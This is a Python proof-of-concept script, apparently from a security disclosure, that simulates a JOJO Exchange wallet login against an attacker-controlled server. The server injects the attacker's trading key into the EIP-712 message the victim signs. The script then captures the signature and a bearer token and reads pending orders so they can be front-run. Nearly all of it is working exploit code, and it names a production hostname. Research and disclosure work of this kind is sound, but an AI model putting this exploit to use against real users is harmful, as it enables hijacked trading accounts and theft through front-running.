#!/usr/bin/env python3.11
"""
F2 PoC — Step 3: Victim simulation.

Replicates the exact sequence app.jojo.exchange's JavaScript makes
when a user clicks "Connect Wallet → Sign → Login".

All three requests go to the malicious server (localhost:5000 in test,
jojo-api-mainnet-0da296028aeb.herokuapp.com in production).

Run AFTER starting malicious_heroku_server.py in another terminal.

Usage:
    # Terminal 1 — malicious server:
    python3.11 malicious_heroku_server.py

    # Terminal 2 — this script:
    python3.11 poc_simulate_victim.py [server_url]
    # Default server_url: http://localhost:5000
"""

import sys
import json
import time
import secrets
import requests
from eth_account import Account
from eth_account.messages import encode_defunct

SERVER = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

# ── Simulated victim wallet (throwaway key, never funded) ─────────────────────
VICTIM_KEY     = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"  # anvil #0
VICTIM_ACCOUNT = Account.from_key(VICTIM_KEY)
VICTIM_WALLET  = VICTIM_ACCOUNT.address
CHAIN_ID       = 8453  # Base mainnet

BROKER_ID = "jojo"

print("=" * 70)
print("JOJO Exchange — Victim Login Simulation (Attack Demonstration)")
print("=" * 70)
print(f"Victim wallet : {VICTIM_WALLET}")
print(f"Attacker server: {SERVER}")
print()

# Shared session with headers matching the JOJO frontend
sess = requests.Session()
sess.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Origin": "https://app.jojo.exchange",
    "Referer": "https://app.jojo.exchange/",
    "orderly-account-address": VICTIM_WALLET,
})

# ── Step 1: GET server time ────────────────────────────────────────────────────
print("[Step 1] GET /v2/serverTime  (login preflight)")
r = sess.get(f"{SERVER}/v2/serverTime", timeout=10)
server_time = r.json()["data"]["serverTime"]
print(f"         → serverTime = {server_time}")

# ── Step 2: POST /temporary/orderlyKey ────────────────────────────────────────
print("\n[Step 2] POST /v2/temporary/orderlyKey  ← INJECTION POINT")
r = sess.post(f"{SERVER}/v2/temporary/orderlyKey", json={}, timeout=10)
orderly_key = r.json()["data"]["orderlyKey"]
print(f"         ← orderlyKey = {orderly_key}")
print(f"         ⚠  This is the ATTACKER'S key — not the victim's!")

# ── Step 3: Build EIP-712 message with the injected key ──────────────────────
expiration = server_time + 31_536_000_000   # +1 year in ms
message = {
    "brokerId":   BROKER_ID,
    "chainId":    CHAIN_ID,
    "orderlyKey": orderly_key,      # ← attacker's key embedded
    "scope":      "read,trading",
    "timestamp":  server_time,
    "expiration": expiration,
}

print(f"\n[Step 3] Build EIP-712 message (victim about to sign)")
print(f"         message = {json.dumps(message, indent=10)}")

# ── Step 4: Simulate MetaMask signature ──────────────────────────────────────
# Real attack: MetaMask signs; victim cannot tell orderlyKey is attacker's
msg_str   = json.dumps(message, separators=(',', ':'))
signable  = encode_defunct(text=msg_str)
sig_obj   = VICTIM_ACCOUNT.sign_message(signable)
signature = sig_obj.signature.hex()

print(f"\n[Step 4] MetaMask 'Sign to log in' → victim clicks SIGN")
print(f"         signature = 0x{signature[:40]}...{signature[-10:]}")
print(f"         ⚠  Victim signed attacker's orderlyKey into the auth payload!")

# ── Step 5: POST /authToken — sends signed EIP-712 to attacker server ────────
print(f"\n[Step 5] POST /v2/authToken  ← ATTACKER RECEIVES SIGNATURE HERE")
body = {
    "message":      message,
    "signature":    "0x" + signature,
    "userAddress":  VICTIM_WALLET,
    "referralCode": "",
}
r = sess.post(f"{SERVER}/v2/authToken", json=body, timeout=10)
resp = r.json()
bearer_token = resp.get("data", {}).get("token", "")
print(f"         ← Bearer token = {bearer_token[:40]}...")
print(f"         ⚠  Attacker now has:")
print(f"              - Victim wallet: {VICTIM_WALLET}")
print(f"              - EIP-712 signature authorizing attacker's orderly key")
print(f"              - Scope: read,trading  /  Expiry: +1 year")
print(f"              → Can register on-chain, place orders for victim indefinitely")

# ── Step 6: Simulate an order-signing request (shows front-run surface) ──────
print(f"\n[Step 6] POST /v2/private/signature  ← SIGNING ORACLE (front-run data)")
sess.headers.update({"Authorization": f"Bearer {bearer_token}"})
order_payload_string = (
    f"{int(time.time()*1000)}"
    f"POST"
    f"/v1/order"
    f'{{"symbol":"PERP_BTC_USDC","side":"BUY","orderType":"LIMIT",'
    f'"orderQuantity":"0.5","orderPrice":"67000","clientOrderId":"{secrets.token_hex(8)}"}}'
)
r = sess.post(
    f"{SERVER}/v2/private/signature",
    headers={"Content-Type": "text/plain"},
    data=order_payload_string,
    timeout=10,
)
print(f"         Signing string sent: {order_payload_string[:100]}...")
print(f"         ⚠  Attacker sees full order BEFORE it's submitted to Orderly")
print(f"              → Front-running opportunity: BUY 0.5 BTC @ 67000 USDC")

print()
print("=" * 70)
print("ATTACK COMPLETE — check Terminal 1 (malicious server) for harvested data")
print("GET /harvested on the malicious server to view all captured credentials")
print("=" * 70)
